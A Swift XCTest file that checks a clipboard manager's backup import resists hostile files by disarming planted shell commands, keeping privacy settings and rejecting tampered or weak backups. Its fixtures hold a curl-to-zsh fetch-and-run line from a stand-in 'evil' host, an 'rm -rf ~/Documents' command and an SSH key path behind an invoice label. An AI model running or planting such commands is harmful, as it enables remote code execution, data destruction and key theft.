import XCTest
import CryptoKit
@testable import Clipvelope

private struct FixedKeyStore: KeyProviding {
    let key: SymmetricKey
    init(seed: UInt8 = 1) { key = SymmetricKey(data: Data(repeating: seed, count: 32)) }
    func getOrCreateKey() throws -> SymmetricKey { key }
}

/// A backup is a file that arrives from outside. These cover what happens when
/// the file is hostile rather than merely old.
final class ImportHardeningTests: XCTestCase {
    private var root: URL!

    override func setUpWithError() throws {
        root = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("clipvelope-harden-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    private func makeStore(_ name: String = "vault", seed: UInt8 = 1) -> ClipboardStore {
        let storage = EncryptedStorage(directory: root.appendingPathComponent(name),
                                       keyStore: FixedKeyStore(seed: seed))
        let store = ClipboardStore(storage: storage, enableSystemIntegration: false)
        settle(store)
        return store
    }

    private func settle(_ store: ClipboardStore, rounds: Int = 4) {
        for _ in 0..<rounds {
            store.drainPendingWork()
            RunLoop.current.run(until: Date().addingTimeInterval(0.02))
        }
    }

    /// A backup carrying shell Quick Slots and privacy switched off.
    private func hostileState() -> AppState {
        var state = AppState.empty
        state.bindings = [ClipboardBinding(id: UUID(), title: "Email signature",
                                           content: "curl -s http://evil/x | zsh",
                                           isShell: true)]
        state.folders = [CommandFolder(id: UUID(), name: "Handy", items: [
            CommandItem(id: UUID(), title: "Tidy up", content: "rm -rf ~/Documents", isShell: true)
        ])]
        state.skipConcealedContent = false
        return state
    }

    private func writeBackup(_ state: AppState, to url: URL, password: String?) throws {
        let json = try JSONEncoder().encode(VaultSnapshot(state: state, payloads: [:]))
        let sealed: Data
        if let password {
            sealed = try BackupCodec.seal(json, password: password, iterations: 100_000)
        } else {
            sealed = try BackupCodec.seal(json, keychainKey: FixedKeyStore(seed: 1).key)
        }
        try sealed.write(to: url)
    }

    // MARK: - Shell commands from an untrusted backup

    /// A password backup is portable: anyone can produce one. Importing it must
    /// not arm a system-wide hotkey with a shell command.
    func testPortableBackupCannotPlantShellCommands() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertEqual(store.bindings.count, 1, "the entry is kept, just disarmed")
        XCTAssertFalse(store.bindings[0].isShell)
        XCTAssertFalse(store.folders[0].items[0].isShell)
        XCTAssertEqual(store.bindings[0].content, "curl -s http://evil/x | zsh",
                       "the text is preserved so the user can see what it was")
    }

    func testTheUserIsToldWhenAnImportWasDisarmed() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        store.importBackup(from: file, password: "pw")
        settle(store)

        let notice = try XCTUnwrap(store.importNotice)
        XCTAssertTrue(notice.contains("shell command"), notice)
    }

    /// A keychain backup can only have been written by something holding this
    /// Mac's key, so it restores faithfully.
    func testDeviceBoundBackupRestoresShellCommandsIntact() throws {
        let file = root.appendingPathComponent("mine.cvb")
        try writeBackup(hostileState(), to: file, password: nil)

        let store = makeStore()
        store.importBackup(from: file, password: nil)
        settle(store)

        XCTAssertTrue(store.bindings[0].isShell)
        XCTAssertNil(store.importNotice)
    }

    // MARK: - Privacy settings

    func testPortableBackupCannotTurnOffPasswordSkipping() throws {
        let file = root.appendingPathComponent("hostile.cvb")
        try writeBackup(hostileState(), to: file, password: "pw")

        let store = makeStore()
        XCTAssertTrue(store.skipConcealedContent)

        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertTrue(store.skipConcealedContent,
                      "an import must never weaken the privacy settings")
    }

    func testPortableBackupCannotRemoveIgnoredApps() throws {
        let store = makeStore()
        store.ignoreApp(bundleID: "com.1password.1password")
        settle(store)

        var state = AppState.empty
        state.ignoredAppBundleIDs = ["com.example.other"]
        let file = root.appendingPathComponent("b.cvb")
        try writeBackup(state, to: file, password: "pw")

        store.importBackup(from: file, password: "pw")
        settle(store)

        XCTAssertTrue(store.ignoredAppBundleIDs.contains("com.1password.1password"),
                      "the local ignore list must survive an import")
        XCTAssertTrue(store.ignoredAppBundleIDs.contains("com.example.other"),
                      "an import may still add to it")
    }

    // MARK: - File references

    /// The label is derived from the path, so a backup cannot show one filename
    /// and paste a different one.
    func testAFileLabelAlwaysMatchesItsPath() throws {
        let json = #"{"path":"/Users/victim/.ssh/id_rsa","name":"Q3-invoice.pdf"}"#
        let ref = try JSONDecoder().decode(ClipboardContent.FileRef.self, from: Data(json.utf8))

        XCTAssertEqual(ref.path, "/Users/victim/.ssh/id_rsa")
        XCTAssertEqual(ref.name, "id_rsa", "the stored label must be ignored")
    }

    // MARK: - KDF parameters

    func testABackupDemandingTooFewRoundsIsRejected() throws {
        let file = try BackupCodec.seal(Data("{}".utf8), password: "pw", iterations: 1)
        XCTAssertThrowsError(try BackupCodec.open(file, password: "pw")) { error in
            guard case BackupCodec.CodecError.weakKDF = error else {
                return XCTFail("expected weakKDF, got \(error)")
            }
        }
    }

    /// The header sits outside the sealed box, so it is authenticated as
    /// associated data; editing it must invalidate the file.
    func testEditingTheHeaderInvalidatesTheBackup() throws {
        var file = try BackupCodec.seal(Data("{}".utf8), password: "pw", iterations: 100_000)
        // Rewrite the iteration count in place (bytes 6..<10: magic + mode + kdf id).
        let lowered = withUnsafeBytes(of: UInt32(100_001).bigEndian, Array.init)
        file.replaceSubrange(6..<10, with: lowered)

        XCTAssertThrowsError(try BackupCodec.open(file, password: "pw"))
    }

    // MARK: - Duplicate ids

    /// The panel indexes rows by id with an initializer that traps on a
    /// duplicate. A backup is a file, and a file can say anything.
    func testABackupWithDuplicateItemIDsImportsWithoutDuplicates() throws {
        let store = makeStore()
        let id = UUID()
        var state = AppState.empty
        state.items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("first"), sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("second"), sourceBundleID: nil),
            ClipboardItem(id: UUID(), createdAt: Date(), isPinned: false, content: .text("third"), sourceBundleID: nil),
        ]
        let url = root.appendingPathComponent("dupes.cvb")
        try writeBackup(state, to: url, password: nil)

        store.importBackup(from: url, password: nil)
        settle(store)

        XCTAssertEqual(store.items.map(\.searchText), ["first", "third"])
        XCTAssertEqual(Set(store.items.map(\.id)).count, store.items.count)
    }

    func testRemovingDuplicateIDsKeepsTheFirstOccurrence() {
        let id = UUID()
        let items = [
            ClipboardItem(id: id, createdAt: Date(), isPinned: false, content: .text("a"), sourceBundleID: nil),
            ClipboardItem(id: id, createdAt: Date(), isPinned: true, content: .text("b"), sourceBundleID: nil),
        ]
        XCTAssertEqual(items.removingDuplicateIDs().map(\.searchText), ["a"])
        XCTAssertEqual([ClipboardItem]().removingDuplicateIDs(), [])
    }
}
